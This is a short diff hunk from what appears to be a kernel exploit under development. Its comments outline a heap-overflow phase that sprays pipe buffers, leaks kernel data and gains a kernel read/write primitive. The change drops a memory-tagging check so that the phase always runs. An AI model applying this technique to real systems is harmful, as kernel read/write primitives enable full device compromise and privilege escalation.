@@ -21076,7 +21076,7 @@ new_modes:
          *   15e: Read pipe buffers to detect corruption (kernel data leak)
          *   15f: If corrupted pipe found, use it for kernel R/W primitive
          * ============================================================ */
-        if (rounds == 229 && r229_mte_match) {
+        if (rounds == 229) {
             rlog("\n--- Phase 15 (r=229): VPS heap overflow + pipe corruption ---\n");
 
             /* 15a: Spray pipe buffers in kalloc.4096
